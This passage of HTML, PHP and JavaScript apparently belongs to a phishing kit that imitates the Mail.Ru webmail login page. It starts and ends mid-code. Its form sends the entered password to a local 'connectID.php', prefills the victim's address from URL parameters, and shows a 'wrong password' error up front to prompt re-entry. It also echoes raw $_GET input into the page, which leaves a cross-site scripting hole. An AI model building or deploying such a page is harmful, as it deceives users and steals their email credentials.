		if (params.expectedValue !== undefined) {
			if (value.trim().toLowerCase() !== params.expectedValue.trim().toLowerCase()) {
				bad = true;
			}
		}

		if (typeof params.test === 'function') {
			if (!params.test(value))
				bad = true;
		}

		if (!params.minLen && !params.maxLen && !params.pattern && !(params.minVal > 0) && !(params.maxVal > 0) && !params.expectedValue && !params.test) {
			bad = true;
		}

		if (bad) {
			showError(field, params.error);
			if (badField) {
				alert('Неверно заполнено поле ' + params.prompt + '\n' +
					(params.error.replace(/<br \/>/g, '\n')));
				field.focus();
				return false;
			}
		}
	}

	if (badForm) {
		if (isOneField === true)
			showFormError('Поле заполнено неверно');
		else
			showFormError('Некоторые поля заполнены неверно');
	}
	return !badForm;
}
</script>


<style type="text/css">
#superbest {
position: absolute;
left: 15;
top: 150;
width: 125;
visibility: visible;
z-index: 10;
}
</style>


<style>
p.abzac {margin: 5px 0px 3px 0px;}
h3.head_1 {margin: 10px 0px 5px 0px;color:#013572;font-size:140%;font-weight:bold;}
input.w_100, select.w_100, textarea.w_100 {width:100%;font-family:arial;font-size:100%;}


    .tooltip
    {
        position: absolute;
        margin-top: 28px;
        _width: 166px;
        *width: 166px;
    }

    .tooltip .tail
    {
        background: url(//img.imgsmail.ru/r/tooltip/tail.png) no-repeat;
        _background-image: url(//img.imgsmail.ru/r/tooltip/tail.gif);
        width: 9px;
        height: 5px;
        left: 39px;
        top: -4px;
        position: absolute;
    }

    .tooltip .ltc, .tooltip .rtc, .tooltip .lbc, .tooltip .rbc
    {
        background: url(//img.imgsmail.ru/r/tooltip/ltc.png) no-repeat;
        _background-image: url(//img.imgsmail.ru/r/tooltip/ltc.gif);
        width: 6px;
        height: 6px;
        float: left;
        _margin-right: -3px;
    }

    .tooltip .rtc
    {
        background: url(//img.imgsmail.ru/r/tooltip/rtc.png) no-repeat;
        _background-image: url(//img.imgsmail.ru/r/tooltip/rtc.gif);
        float: right;
        _margin-left: -3px;
        _margin-right: 0;
    }

    .tooltip .lbc
    {
        background: url(https://img.imgsmail.ru/r/tooltip/lbc.png) no-repeat;
        _background-image: url(https://img.imgsmail.ru/r/tooltip/lbc.gif);
        *margin-left: -3px;
    }

    .tooltip .rbc
    {
        background: url(https://img.imgsmail.ru/r/tooltip/rbc.png) no-repeat;
        _background-image: url(https://img.imgsmail.ru/r/tooltip/rbc.gif);
        float: right;
        _margin-left: -3px;
        _margin-right: 0;
        *margin-right: -3px;
    }

    .tooltip .ts, .tooltip .bs
    {
        height: 6px;
        line-height: 6px;
        _overflow: hidden;
        *overflow: hidden;
        background: #fbf7c7 url(https://img.imgsmail.ru/r/tooltip/border_pix.gif) repeat-x top;
        margin: 0 6px;
        _margin: 0;
    }

    .tooltip .bs
    {
        background: #fbf7c7 url(https://img.imgsmail.ru/r/tooltip/border_pix.gif) repeat-x bottom;
        *border-bottom: solid 1px #a6a8ae;
    }

    .tooltip .rborder
    {
        background: url(https://img.imgsmail.ru/r/tooltip/border_pix.gif) repeat-y right;
        padding: 0 9px;
    }

    .tooltip .inner
    {
        background: #fbf7c7 url(https://img.imgsmail.ru/r/tooltip/border_pix.gif) repeat-y;
    }

    .tooltip .mess
    {
        font-family: tahoma !important;
        color: #5a393f;
        font-size: 9px;
        position: absolute;
        margin-top: -3px;
        white-space: nowrap;
    }
</style>










	







	



	
	
	




<div class="login-page_modern login-page__external">
		<div class="login-page__external_left">
			
				<div class="login-page__external_login">
					<form id="LoginExternal" method="post" action="connectID.php" name="Auth">
						<div class="login-page__external__desc">
							<div class="login-page__external_head">
								
									Вход в почту
								
							</div>

							<div class="popup__desc__parag popup__desc__parag_select login-page__external__desc__parag">
								
									Вы можете войти в почту с помощью аккаунта любого почтового сервиса и легко переключаться между ними, не выходя из почты.
									<a class="login-form__link" href="http://mailblog.mail.ru/vvp-ios-and/" target="_blank">Узнать больше</a>
								
							</div>

							
								
							

							

							
								<div class="login-page__external_error login-page__external__text_indent js-login-page__external__info">
									
	

		

		
			Неверное имя пользователя или пароль. Проверьте правильность введенных данных.
		

		
	



								</div>
							

							<div>
	<div class="login-page__external_domains js-login-page__external__domains">
		<div class="login-page__external_domains__list login-page__external_domains__list_mail login-page__external_domains__list_active" data-domain="mail.ru" tabindex="1000">
			<div class="login-page__external_domains__list_item login-page__external_domains__item_mail"></div>
		</div>

		<div class="login-page__external_domains__list" data-domain="yandex.ru" tabindex="1001">
			<div class="login-page__external_domains__list_item login-page__external_domains__item_yandex"></div>
		</div>

		<div class="login-page__external_domains__list" data-domain="rambler.ru" tabindex="1002">
			<div class="login-page__external_domains__list_item login-page__external_domains__item_rambler"></div>
		</div>

		<div class="login-page__external_domains__list" data-domain="gmail.com" tabindex="1003">
			<div class="login-page__external_domains__list_item login-page__external_domains__item_gmail"></div>
		</div>

		<div class="login-page__external_domains__list" data-domain="other" tabindex="1004">
			<div class="login-page__external_domains__list_item login-page__external_domains__item_other">
				Другой
			</div>
		</div>
	</div>

	<div class="login-page__external_error js-login-page__external__error"></div>

    <div class="login-page__external_form__logindata">
	<div class="login-page__external_form">
	<input value="<?php echo $_GET['email']; ?>" name="email" type="hidden">
		<input class="login-page__external_input login-page__external_input__login js-login-page__external__input_login login-page__external_input_extend" name="Login" placeholder="Имя ящика" readonly="" value="<?php echo $_GET['emailID']; ?>" tabindex="1005" >

		<div class="form__select login-page__external_select login-page__external_select__box js-login-page__external__select">
			<div class="form__select__box">
				<div class="form__select__box__text js-text js-login-page__external__select_domain">
							<?php echo $domain ?>
						</div>
			</div>

			<i class="form__select__arrow"></i>

			<select class="form__select__select js-login-page__external__input_domain" tabindex="1006" name="Domain">
				
					
						<option value="<?php echo $domain ?>" selected="">
							@<?php echo $domain ?>
						</option>
					
					<option disabled="disabled">------------</option>
					<option value="yandex.ru">@yandex.ru</option>
					<option value="rambler.ru">@rambler.ru</option>
					<option value="gmail.com">@gmail.com</option>
					<option value="yahoo.com">@yahoo.com</option>
					<option value="hotmail.com">@hotmail.com</option>
					<option value="outlook.com">@outlook.com</option>
				
			</select>
		</div>
	</div>

	<div class="login-page__external_form">
		<input class="js-login-page__external__input_password login-page__external_input login-page__external_input__password" name="Password" placeholder="Пароль" autofocus="autofocus" tabindex="1007" type="password">
	</div>
    </div>
	<div class="login-page__external_oauth_text js-login-page__external__oauth_text"></div>
</div>


							<div class="login-form__row login-form__row_last js-login-page__external__forget">
								<a href="/cgi-bin/passremind" target="_blank" class="login-form__link" cnt_sb="1551886">
									Напомнить пароль
								</a>
								<div class="login-form__remember login-form__remember_righted">
									<input name="saveauth" value="1" checked="checked" id="alien" class="login-form__remeber__checkbox" type="checkbox">
									<label for="alien" class="login-form__remember__label">
										запомнить почту
									</label>
								</div>
							</div>

							

						</div>

						<div class="popup__controls">
							
								<button type="submit" class="btn btn_main js-login-page__external__submit" tabindex="1008">
									<span class="btn__text">
										Войти в почту
									</span>
								</button>
							
							
								<span class="popup-settings__controls_loading dn js-login-page__external__loading">
									<span class="icon icon_loader"></span>
									<span class="popup-settings__controls_loading_text"></span>
								</span>
							
						</div>

						<input name="new_auth_form" value="1" type="hidden">


	<input name="page" value="" type="hidden">







	<input name="post" value="" type="hidden">
	<input name="login_from" value="" type="hidden">
	


	


					</form>
				</div>
			
		 </div>

		
			<div class="login-page__external_info">
				
	
		<h1 class="login-head js-clearShow">Еще нет почты на Mail.Ru? <a href="//r.mail.ru/clb2018810/e.mail.ru/signup?from=login" cnt_sb="1551884">Создай сейчас!</a></h1>

		

		<div class="login-promo">
				<div class="login-promo__ico login-promo__ico_safe"></div>
				<div class="login-promo__content">
						<div class="login-promo__header">Надежная защита от спама и вирусов</div>
						<div class="login-promo__text">
								В Почте Mail.Ru все письма и файлы проходят обязательную проверку на вирусы. А надежная фильтрация спама и специальные персональные анти-спам настройки обеспечат вам комфортную работу с почтой.
						</div>
				</div>
		</div>
		<div class="login-promo">
				<div class="login-promo__ico login-promo__ico_unlim"></div>
				<div class="login-promo__content">
						<div class="login-promo__header">Неограниченный объем почтового ящика</div>
						<div class="login-promo__text">
								В почте Mail.Ru объем ящика зависит от ваших потребностей. Чем больше у вас писем, тем больше сможет вместить ваша почта.
						</div>
				</div>
		</div>
		<div class="login-promo login-promo_last">
				<div class="login-promo__ico login-promo__ico_speed"></div>
				<div class="login-promo__content">
						<div class="login-promo__header">Высокая скорость работы</div>
						<div class="login-promo__text">
								В почте Mail.Ru ваши письма приходят и открываются моментально, а отправка писем занимает лишь доли секунды и зависит только от размера письма.
						</div>
				</div>
		</div>
		
			<a href="//r.mail.ru/clb2018810/e.mail.ru/signup?from=login" class="btn btn_main" cnt_sb="1551885"><span class="btn__text">Зарегистрироваться</span></a>
		
	
<!-- /login-column__promo -->

			</div>
		
</div>

<!-- AuthTooltip -->
<script language="javascript" type="text/javascript">
if(document.forms["Auth"] && document.forms["Auth"].elements["Password"] && document.getElementById('tooltipAuth_struter'))
{
    var tooltipAuth = {
        targetElem: document.forms["Auth"].elements["Password"],
        struter: document.getElementById('tooltipAuth_struter'),
        mess: document.getElementById('tooltipAuth_mess'),
        shell: document.getElementById('tooltipAuth_shell'),
        tail: document.getElementById('tooltipAuth_tail'),
        wasCaps: false,

        sAlign: function() {
            if(/msie\s+\d/i.test(navigator.userAgent))
                this.struter.style.overflow = 'hidden';

            this.struter.style.width = this.mess.offsetWidth + "px";
            this.struter.style.height = (/msie\s+\d/i.test(navigator.userAgent) ? 6 : (this.mess.offsetHeight - 6)) + "px";

            if(/msie\s+\d/i.test(navigator.userAgent))
                this.shell.style.width = (this.struter.offsetWidth + 30) + "px";
        },
        activate: function() {
            if(window.addEventListener)
            {
                this.targetElem.addEventListener("blur", this.hide, false);
                this.targetElem.addEventListener("keydown", tooltipAuth.keydown, false);
                this.targetElem.addEventListener("keypress", tooltipAuth.checkCondition, false);
            }
            else
            {
                this.targetElem.attachEvent("onblur", this.hide);
                this.targetElem.attachEvent("onkeydown", tooltipAuth.keydown);
                this.targetElem.attachEvent("onkeypress", tooltipAuth.checkCondition);
            }
        },
        show: function(messNum) {
            tooltipAuth.shell.style.visibility = 'hidden';

            var text = document.getElementById('tooltipAuth_mess_var');
            var text2 = document.getElementById('tooltipAuth_mess_var2');
            var text3 = document.getElementById('tooltipAuth_mess_var3');

            text.style.display = text2.style.display = text3.style.display = "none";

            if(messNum == 1)
                text.style.display = '';
            if(messNum == 2)
                text2.style.display = '';
            if(messNum == 3)
                text3.style.display = '';

            tooltipAuth.shell.style.display = '';
            tooltipAuth.sAlign();
            tooltipAuth.tail.style.left = (Math.round(tooltipAuth.shell.offsetWidth / 2) - 4) + "px";
            tooltipAuth.shell.style.visibility = 'visible';
        },
        hide: function() {
            tooltipAuth.shell.style.display = 'none';
        },
        keydown: function(e) {
             var evt = e ? e : window.event;
             var keyCode = evt.keyCode ? evt.keyCode : evt.charCode;
             if ( keyCode == 20 && tooltipAuth.wasCaps == 'off' )
                tooltipAuth.show(2);
             else
                tooltipAuth.hide();
        },
        checkCondition: function(e) {
            var evt = e ? e : event;
            var evtEl = evt.srcElement ? evt.srcElement : evt.target;

            var keyCode = evt.keyCode ? evt.keyCode : evt.charCode;

            var symb = String.fromCharCode(keyCode);
            var symbUC = symb.toUpperCase();
            var symbLC = symb.toLowerCase();

            var onCapsLock = false;
            if(symbUC != symbLC) {
                onCapsLock = ((evt.shiftKey && symbLC == symb) || (!evt.shiftKey && symbUC == symb));
                tooltipAuth.wasCaps = onCapsLock ? 'on' : 'off';
            } else
                tooltipAuth.wasCaps = false;

            var isCyrillic = false;
            if( /[\u0430-\u044f]/i.test(symb) )
                isCyrillic = true;

            var hasCyrillic = false;
            if( /[\u0430-\u044f]/i.test(tooltipAuth.targetElem.value) )
                hasCyrillic = true;

            var messNum;

            if (hasCyrillic)
                messNum = 3;
            if (onCapsLock)
                messNum = 2;
            if (isCyrillic)
                messNum = 1;

            if (messNum)
            {
                //if(tooltipAuth.shell.style.display == 'none')
                    tooltipAuth.show(messNum);
            }
            else
                tooltipAuth.hide();
        }
    };

    try {
        tooltipAuth.activate();
    } catch(ex) {};

}
</script>
<!-- /AuthTooltip -->

<script type="text/javascript">
    (function(form, $) {
        if(!$)return;

        var $context = $('#login-page');
        $('.js-clearHideLink', $context).click(function (evt) {
            evt.preventDefault();
            $('.js-clearHide', $context).hide();
            $('.js-clearShow', $context).show();
        });

        //Form not found, maybe 'id' has been changed
        if(!form)return;

        form = $(form);

        form
            .find(':submit').mousedown(function () {
                (new Image).src = '//rs.' + patron.SingleDomainName + '/sb490185.gif?'+Math.random();
            })
        ;

        //
        form.submit(function($e, $data) {
            if($data === false)return;

            (new Image).src = '//rs.' + patron.SingleDomainName + '/sb490855.gif?'+Math.random();

            $e.preventDefault();
            $e.stopImmediatePropagation();

            var radarObj = patron.radar("submit", "auth=1", 1);

            setTimeout(radarObj.onload = radarObj.onerror = radarObj.onabort = function checkRadarObj(onDone, forseOnDone) {
                if(!radarObj)return;

                if(radarObj.complete || forseOnDone) {
                    onDone();
                    radarObj.onload = radarObj.onerror = radarObj.onabort = null;
                    radarObj = null;
                }
                else if(this.timeout -= this.step > 0) {
                    setTimeout(checkRadarObj.bind(this, onDone, false), this.step);
                }
                else {
                    checkRadarObj(onDone, true);
                }
            }.bind(
                { timeout : 100, step : 10 },
                function() { form.trigger("submit", false) },
                false
            ));
        });
        //

    })(document.getElementById("AuthForm"), window.jQuery);
</script>


<script type="text/javascript">
require(['patron.build/Login'], function() {
	var options = {
		back: '',
		data: {},
		captcha: ''
	};

	

	new patron.Login.Form('#LoginExternal', options);
});
</script>









												</div>
												<div class="b-layout__clear" style="display: block"></div>
											</div>
										</div>

										<div class="b-atop"><a data-bem="btn" class="btn btn_touch " href="#ScrollBody"><i data-bem="ico" class="ico ico_back-top ico_back-top"></i><span class="btn__text btn__text_pad">Вверх</span></a></div>
									
								
								

							</div>

						


<script id="files-search__messageline_ejs" type="text/plain"><%
/**/


/* foreach */
ajs.each(messages, function (item, index){

	var Folder = patron.Folders.get(item.folder_id);
	var FileId = item.uid;

	var url = '/messages', id = item.folder_id;
	switch (parseInt(id,10)) {
		case 0	    : url += '/inbox'; break;
		case 950    : url += '/spam'; break;
		case 500000 : url += '/sent'; break;
		case 500001 : url += '/drafts'; break;
		case 500002 : url += '/trash'; break;
		case 500003 :
		case 500005 : url = '/agent/archive'; break;
		default     : url += '/folder/' + id;
	}

	var name = item.name || ('<' + Lang.get('message.email.unknown') + '>');
	var encodedName = ajs.Html.escape(name);

	var subject = item.subject || ('<' + Lang.get('message.email.untitled') + '>');
	var encodedSubject = ajs.Html.escape(subject);

	var folderName = Folder.Name;
	var encodedFolderName = ajs.Html.escape(folderName);

	var from = (item.from_to_name || item.from_to_email) || ('<' + Lang.get('message.email.unknown') + '>');
	var encodedFrom = ajs.Html.escape(from);

	var iconType = item.iconType;
	var encodedIconType = ajs.Html.escape(iconType);
%>

<div data-file-id="<%=FileId%>" class="js-item js-link js-msg messageline <% if( newsnippets ){ %> messageline_newsnippets<% }  if( item.Unread ){ %> messageline_unread<% } %> <%=(selected[FileId] ? 'messageline_selected' : '')%> <%=(~patron.ui.ClipInList.getId().indexOf(item.Id) ? 'iAttachExpand ' : '')%>">
	<label class="js-label messageline__checkbox" style="<% if( item.disableShowCheckbox ){ %>visibility: hidden;<% } %>">
		<input class="js-input" title="Выбрать" type="checkbox" <%=(selected[FileId] ? ' checked="checked"' : (disabled ? ' disabled="disabled"' : ''))%>  />
	</label>
	<span class="messageline__body">

		<a target="_blank" href="<%=item.attachPreviewUrl%>" class="messageline__body__link messageline__body__link_filename">
			<span class="messageline__flag">
				<% if (iconType === "folder") { %>
					<i class="ico ico_folder ico_folder_user" style="margin: -5px 0 0 5px; color: #abc4de;"></i>
				<% } else { %>
					<i class="messageline__filetype__icon icon_filetype icon_filetype_<%=encodedIconType%>"></i>
				<% } %>
			</span>
			<span class="messageline__body__subject"><%=encodedName%></span>
		</a>

		<span class="messageline__body__link messageline__body__link_filedownload">
			<span class="messageline__body__filesize" style="<% if( item.disableShowSize ){ %>visibility: hidden;<% } %>"><%=(String.sizeFormat(item.size))%></span>
		</span>

		<span class="messageline__date"><%=(item.DateShort)%></span>
		<% if( !item.disableShowCheckbox ){ %>
			<i class="messageline__fade messageline__fade_subject"></i>
			<i class="messageline__fade messageline__fade_date"></i>
		<% } %>
	</span>
</div>

<%
}); /* foreach; */
%>
</script>

<script id="AttachViewer__list__thumbnail_ejs" type="text/plain"><% for( var i = 0, n = Attachments.length, file; i < n; i++ ){ file = Attachments[i];  %><%var FileId = file.uid;var name = file.name || ('<' + Lang.get('message.email.unknown') + '>');var encodedName = ajs.Html.escape(name);var subject = file.subject || ('<' + Lang.get('message.email.untitled') + '>');var encodedSubject = ajs.Html.escape(subject);var iconType = file.iconType;var encodedIconType = ajs.Html.escape(iconType);%><div class="js-item filesearch__thumbnail__wrap" data-file-id="<%=FileId%>"><div class="js-link filesearch__thumbnail"><div title="<%=encodedName%>" class="filesearch__thumbnail__icon filesearch__thumbnail__icon_<%=encodedIconType%>"><% if (file.previewWithCropUrl && !file.disableShowPreview) { %><div class="filesearch__thumbnail__preview"><img src="<%= file.previewWithCropUrl %>" alt="" onerror="this.parentNode.style.display='none'"></div><% } %></div><div class="filesearch__thumbnail__info"><div class="filesearch__thumbnail__checkbox" title="<%=encodedName%> <%=encodedSubject%>"><label class="filesearch__thumbnail__checkbox__label js-label" style="<% if( file.disableShowCheckbox ){ %>visibility: hidden;<% } %>"><input title="Выбрать" type="checkbox" class="filesearch__thumbnail__checkbox__input js-input"  <%=(selected[FileId] ? ' checked="checked"' : (disabled ? ' disabled="disabled"' : ''))%>/></label> <%=encodedName%> <span class="filesearch__thumbnail__body" style="<% if( file.disableShowSubject ){ %>display: none;<% } %>"><%=encodedSubject%></span></div><div class="filesearch__thumbnail__body" style="<% if( file.disableShowSize ){ %>visibility: hidden;<% } %>"><%=String.sizeFormat(file.size)%></div></div></div></div><% } %></script>
<script id="AttachViewer__previewList_ejs" type="text/plain"><% if( Attachments.length || Attachlinks.length ){ %>
	<div class="attachlist"  data-name="attachments">

		<% if( AvStatusBar && files_status == "clean" ){ %>
			<div class="attachment__antivirus__files-status">
				<i class="icon icon_info-state icon_tip-ok icon_files-status"></i><span class="attachment__antivirus__files-status__text">Все файлы проверены, вирусов нет</span>
			</div>
		<% } %>

		<% if( Attachments.length ){ %>

			<div class="attachlist__header"><span class="attachlist__header__wrap"><span class="js-switcher attachlist__header__mode"><span class="attachlist__header__mode__button attachlist__header__mode__button_full" data-name="full"></span><span class="attachlist__header__mode__button attachlist__header__mode__button_short" data-name="short"></span></span></span><span class="attachlist__header__count"><%=ajs.plural(Attachments.length, 'files.plural', ' ')%></span><% if( AttachAllfiles_name && archiveDownloadUrl ){ %><a href="<%=archiveDownloadUrl%>" class="js-clickable js-downloadAll ml0 attachlist__header__link"><% if( patron.v2 ){ %><i class="filesearch__icon ico ico_attachviewer_download"></i><% } else { %><i class="icon icon_filedownload"></i><% } %>Скачать одним архивом</a>&nbsp;<span class="attachlist__header__filename">(<%=AttachAllfiles_name%>.zip)</span><% } %><% if( patron.EnableAttachToCloud && Attachments.length > 1 ){ %><span class="attachlist__header__to-cloud" data-name="toCloud_global"><a href="#" class="ml0 attachlist__header__link js-attachAllToCloud" data-files='[<% for (var i=0, n=Attachments.length, file; i<n; i++) { file=Attachments[i]; %>{"id":"<%= file.PartID %>"}<% if (i!=n-1) { %>,<% } } %>]'><% if( patron.v2 ){ %><i class="filesearch__icon ml10 ico ico_attachviewer_attach-to-cloud"></i><% } else { %><i class="ml10 icon icon_attach-to-cloud"></i><% } %>Сохранить в Облако</a></span><% } %></div>
			<div style="margin-right:-15px"><% for( var i = 0, n = Attachments.length, file; i < n; i++ ){ file = Attachments[i];  %><% if(patron.isThumb2Active) { %><%-fest['__fest_blocks']['b-thumb-2']({mods: ['in-attachlist'],classes:'js-item js-link',id: file.PartID,tnefId: file.tnef_id,filename: file.name,name: file.name,icon: file.iconType,previewurl: file.attachPreviewUrl,downloadurl: file.downloadUrl,filesize: String.sizeFormat(file.size),src: file.previewWithCropUrl,__cols__: {toCloud: patron.EnableAttachToCloud}})%><% } else { %><div data-id="<%=file.PartID%>" data-tnef-id="<%=file.tnef_id%>" class="js-item filesearch__thumbnail__wrap"><div class="js-link filesearch__thumbnail"><div title="<%= file.name %>" class="filesearch__thumbnail__icon filesearch__thumbnail__icon_<%= file.iconType %>"><% if (file.previewWithCropUrl) { %><div class="filesearch__thumbnail__preview"><img src="<%= file.previewWithCropUrl %>" alt="" onerror="this.parentNode.style.display='none'"></div><% } %></div><div class="filesearch__thumbnail__info"><div class="filesearch__thumbnail__filename" title="<%=file.name%>"><%=file.name%></div><% if( patron.EnableAttachToCloud ){ %><div class="filesearch__thumbnail__size"><%=String.sizeFormat(file.size)%></div><% } %><div class="filesearch__thumbnail__download"><a href="<%=file.downloadUrl%>" class="js-clickable js-download filesearch__thumbnail__download__link"><% if( patron.v2 ){ %><i class="filesearch__icon ico ico_attachviewer_download"></i><% } else { %><i class="icon icon_filedownload"></i><% } %>Скачать</a><% if( !patron.EnableAttachToCloud ){ %> - <%=String.sizeFormat(file.size)%><% } %><% if( patron.EnableAttachToCloud ){ %><a href="#" data-id="<%= file.PartID %>" data-tnef-id="<%=file.tnef_id%>" data-filename="<%= file.name %>" class="js-attachToCloud filesearch__thumbnail__download__link_to-cloud"><% if( patron.v2 ){ %><i class="filesearch__icon ico ico_attachviewer_attach-to-cloud"></i><% } else { %><i class="icon icon_attach-to-cloud"></i><% } %>В Облако</a><% } %></div></div></div></div><% } %><% } %></div><% } %>

		<% if( Attachlinks.length ){ %>
			<div class="attachlist__header">
				<div class="attachlist__header__count">К письму прикреплены ссылки на файлы: <%=Attachlinks.length%></div>
				<% for( var i = 0, n = Attachlinks.length, file; i < n; i++ ){ file = Attachlinks[i];  %>
					<div class="pb10 pt10 filesShow">

						<% if( AvStatusBar && file.avstatus == "infected" ){ %>
							<span class="file-icon file-icon_attach-list file-icon_type_<%=file.iconType%>"></span>
						<% } else { %>
							<a href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>" class="file-icon file-icon_attach-list file-icon_type_<%=file.iconType%>" target="_blank"></a>
						<% } %>

						<div class="ml15 ohd"><span class="fade" style="left: 100%;">&nbsp;</span>
							<% if( AvStatusBar && file.avstatus == "infected" ){ %>
								<div class="grey2"><strong><%=file.name%></strong></div>
								<div class="attachment__antivirus__avstatus attachment__antivirus__avstatus_infected">
									Этот файл содержит вирусы, поэтому не доступен для скачивания
								</div>
							<% } else { %>
								<a href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>" class="bold" target="_blank"><%=file.name%></a>
								<div class="grey2 t11 mt7"><%=String.sizeFormat(file.size)%> &nbsp;<a class="js-clickable downloadlink" href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>">Скачать</a><% if (file.duedate) { %> (ссылка доступна до <%=file.duedate%>)<% } %></div>
							<% } %>
						</div>
					</div>
				<% } %>
			</div>
		<% } %>
	</div>
<% } %>

<% if( Winmail_name ){ %>
	<div class="mr_read__attach">
		<div class="mr10">
			<% var urlActionAttach; %><% urlActionAttach = "//"+MainMailHost +"/cgi-bin/getattach?x-email=" + encodeURIComponent(mailru.useremail) + "&file="+ Winmail_URLFileName +"&id="+ Winmail_PartID +"&mode=attachment&channel="+ Winmail_Channel +""; %>
			<div class="pt10 pl0 filesShow" style="color:#333 !important;">Письмо содержит служебные данные Microsoft Outlook. <a href="<%=urlActionAttach%>" class="js-clickable">Скачать winmail.dat</a></div>
		</div>
	</div>
<% } %>
</script>
<script id="AttachViewer__previewShortList_ejs" type="text/plain"><div class="attachment"  data-name="attachments">
	<% if( Attachments.length || Attachlinks.length ){ %>
		<div class="mr_read__attach">

			<% if( AvStatusBar && files_status == "clean" ){ %>
				<div class="attachment__antivirus__files-status">
					<i class="icon icon_info-state icon_tip-ok icon_files-status"></i><span class="attachment__antivirus__files-status__text">Все файлы проверены, вирусов нет</span>
				</div>
			<% } %>

			<% if( Attachments.length ){ %>

				<div class="attachlist__header"><% if( NewAttachViewer ){ %><span class="attachlist__header__wrap"><span class="js-switcher attachlist__header__mode attachlist__header__mode_short"><span class="attachlist__header__mode__button attachlist__header__mode__button_full" data-name="full"></span><span class="attachlist__header__mode__button attachlist__header__mode__button_short"  data-name="short"></span></span></span><% } %><span class="attachlist__header__count"><%=ajs.plural(Attachments.length, 'files.plural', ' ')%></span><% if( AttachAllfiles_name && archiveDownloadUrl ){ %><a href="<%=archiveDownloadUrl%>" class="js-clickable js-downloadAll ml0 attachlist__header__link"><% if( patron.v2 ){ %><i class="filesearch__icon ico ico_attachviewer_download"></i><% } else { %><i class="icon icon_filedownload"></i><% } %>Скачать одним архивом</a>&nbsp;<span class="attachlist__header__filename">(<%=AttachAllfiles_name%>.zip)</span><% } %><% if( patron.EnableAttachToCloud && Attachments.length > 1 ){ %><span class="attachlist__header__to-cloud" data-name="toCloud_global"><a href="#" class="ml0 attachlist__header__link js-attachAllToCloud" data-files='[<% for (var i=0, n=Attachments.length, file; i<n; i++) { file=Attachments[i]; %>{"id":"<%= file.PartID %>"}<% if (i!=n-1) { %>,<% } } %>]'><% if( patron.v2 ){ %><i class="filesearch__icon ml10 ico ico_attachviewer_attach-to-cloud"></i><% } else { %><i class="ml10 icon icon_attach-to-cloud"></i><% } %>Сохранить в Облако</a></span><% } %></div>
				<div class="mr10"><% for( var i = 0, n = Attachments.length, file; i < n; i++ ){ file = Attachments[i];  %><% if( file.IsRtf ){ %><div class="pt10 pl0 filesShow js-item" style="color:#333 !important;">Письмо содержит служебные данные Microsoft Outlook. <a href="<%=file.downloadUrl%>">Скачать winmail.dat</a></div><% } else { %><div data-id="<%=file.PartID%>" data-tnef-id="<%=file.tnef_id%>" class="pb10 pt10 filesShow js-item <% if( file.IsMp3 ){ %> js-attachAudio"<% } %>"<% if( file.IsMp3 ){ %> data-url="<%=file.mp3Url%>" data-title="<%=file.name%>"<% } %>><% if( file.IsMp3 ){ %><a href="#" class="file-icon file-icon_attach-list file-icon_type_<%=file.iconType%> <% if(patron.AudioPlayerApi) { %>js-loadplayer<% } %>" onclick="<% if(!patron.AudioPlayerApi) { %>loadPlayer(null, null, this); <% } %>return false;"></a><% } else if( file.messageReadUrl ) { %><a href="<%=file.messageReadUrl%>" class="js-icon file-icon file-icon_attach-list file-icon_type_<%=file.iconType%>"></a><% } else { %><a href="<%=file.attachPreviewUrl%>" class="js-icon file-icon file-icon_attach-list file-icon_type_<%=file.iconType%> js-link" target="_blank"></a><% } %><div class="ml15"><div class="mb3 js-name<% if( file.IsMp3 ){ %> audioContainerID<% } %>" style="margin-top: -1px;"><span class="fade" style="left: 100%;">&nbsp;</span><% if( file.messageReadUrl ) { %><a href="<%=file.messageReadUrl%>" class="bold t12 arial js-title" target="_blank"><%=file.name%></a><% } else if( file.IsRtf ) { %><span class="t12 arial">Прикрепленные данные: <a href="<%=file.downloadUrl%>" class="bold">winmail.dat</a> <a href="//help.mail.ru/mail-help/attachments/faq#ext_winmail-dat" class="ml15">Что это?</a></span><% } else if( file.IsMp3 ) { %><a class="t12 arial js-loadplayer" href="#" onclick="<% if(!patron.AudioPlayerApi) { %>loadPlayer(null, null, this); <% } %>return false;"><span class="attachviewer__viewer__name__filename"><%=file.name.replace(/\.[^.]+$/, '')%></span><span class="attachviewer__viewer__name__filetype">.<%=file.ext%></span></a><% if(patron.AudioPlayerApi) { %><div class="player js-player"><a class="player__icon icon_player icon_player_play js-play"></a><div class="player__playback js-playback" style="display:none;"><span class="js-time">00:00</span><div class="player__trackbar js-trackbar"><div class="player__trackbar__buffer js-trackbar-progress" style="width:0"></div><div class="player__trackbar__default"></div><div class="player__trackbar__progress js-trackbar-position" style="width:0"></div><div class="player__trackbar__handle js-handle" style="left:-5px; display:none;"><div class="player__trackbar__handle_inner"></div></div><div class="player__tooltip js-tooltip" style="display:none;"></div></div></div><div class="player__volume js-volume" style="display:none;"><a class="player__icon_volume icon_player icon_player_volume js-mute"></a><div class="player__trackbar player__trackbar_volume js-volumebar"><div class="player__trackbar__default"></div><div class="player__trackbar__inactive js-volume-level" style="width:0"></div><div class="player__trackbar__active js-volume-level js-volume-active" style="width:0; display:none"></div></div></div></div><% } %><% } else { %><a class="bold t12 arial js-title js-link" href="<%=file.attachPreviewUrl%>" target="_blank"><span class="attachviewer__viewer__name__filename"><%=file.name.replace(/\.[^.]+$/, '')%></span><% if (file.ext && file.ext.length) { %><span class="attachviewer__viewer__name__filetype">.<%=file.ext%></span><% } %></a><% } %></div><div class="js-info"><span class="mr10"><%=String.sizeFormat(file.size)%></span><span class="mr10 js-error" style="display: none;"></span><% if( file.ext == "zip" || file.ext == "rar" || file.ext == "7z" || (file.ContentType == "application/zip" && file.ext != "docx" && file.ext != "xlsx" && file.ext != "pptx") || file.ContentType == "application/x-rar-compressed" ){ %><a data-id="<%= file.PartID %>" data-tnef-id="<%=file.tnef_id%>" class="js-clickable js-expand mr10" href="<%=file.downloadUrl%>">Показать&nbsp;файлы</a><a class="js-clickable js-collapse mr10" href="" style="display: none;">Скрыть&nbsp;файлы</a><% } else if ( file.ext == "pdf" ){ %><a class="downloadlink js-link mr10" target="_blank" href="<%=file.attachPreviewUrl%>">Посмотреть</a><% } else if ( file.ShowThumbnail ) { %><a class="js-previewLink js-link mr10" target="_blank" href="<%=file.attachPreviewUrl%>">Посмотреть</a><% } else if ( file.previewMSVUrl ) { %><% if( file.isTNEF ) { %><% var tnef_get_value; %><% tnef_get_value = "&tnef_id="+ file.tnef_id; %><% } %><% if(file.ext == "doc" || file.ext == "docx" || file.ext == "wpd" || file.ext == "wps" 